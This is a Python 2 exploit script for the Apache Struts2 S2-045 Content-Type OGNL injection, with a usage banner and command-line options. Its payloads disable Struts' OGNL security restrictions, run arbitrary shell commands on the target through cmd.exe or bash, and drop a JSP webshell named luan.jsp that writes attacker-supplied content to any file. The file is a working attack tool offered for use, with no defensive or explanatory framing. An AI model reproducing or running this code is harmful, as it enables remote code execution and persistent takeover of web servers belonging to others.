import urllib 
import urllib2
import sys,getopt,ctypes
def exp(url,payload):
    try:
        opener = urllib2.build_opener()
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        req.add_header('Content-Type',payload)
        return opener.open(req, "").read()
    except urllib2.URLError,e:
        return "fail"
    return "fail"
class Color:
    std_out_handle = ctypes.windll.kernel32.GetStdHandle(-11)
    def print_(self, print_text):
        print print_text  
    def print_green_text(self, print_text):  
        self.set_cmd_color(0x02 | 0x08)  
        print print_text  
        self.reset_color()
    def print_red_text(self, print_text):  
        self.set_cmd_color(0x04 | 0x08)  
        print print_text  
        self.reset_color()
    def reset_color(self):  
        self.set_cmd_color(0x04 | 0x02 | 0x01)  
    def set_cmd_color(self, color, handle=std_out_handle):  
        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)  
        return bool  
jspCode = "By<%new java.io.FileOutputStream(request.getParameter(\\\"f\\\")).write(request.getParameter(\\\"c\\\").getBytes());%>Luan"
clr = Color()
clr.print_green_text("S2-045 Exploit // Code By Luan QQ:1524946693")
opts, args = getopt.getopt(sys.argv[1:], "u:c:p:")
url,cmd,path = "","",""
for op, value in opts:
    if op == '-u':
        url = value
    elif op == '-c':
        cmd = value
    elif op == '-p':
        path = value
if url == "":
    clr.print_red_text("Useage : exp.py -u url [-c cmd] [-p upfilePath]")
    sys.exit(0)
if cmd == "":
    clr.print_("upload webshell ...")
    if path == "":
        path = "#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')"
    else:
        path = "'" + path + "'"
    payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=" + path + ").(#shell='" + jspCode + "').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/luan.jsp').append(#shell)).close()).(#cmd='echo \\\"write file to '+#path+'/luan.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
else:
    clr.print_("run " + cmd + " ...")
    payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
result = exp(url,payload)
if result == "fail":
    clr.print_red_text("Exploit Fail")
else:
    clr.print_green_text(result)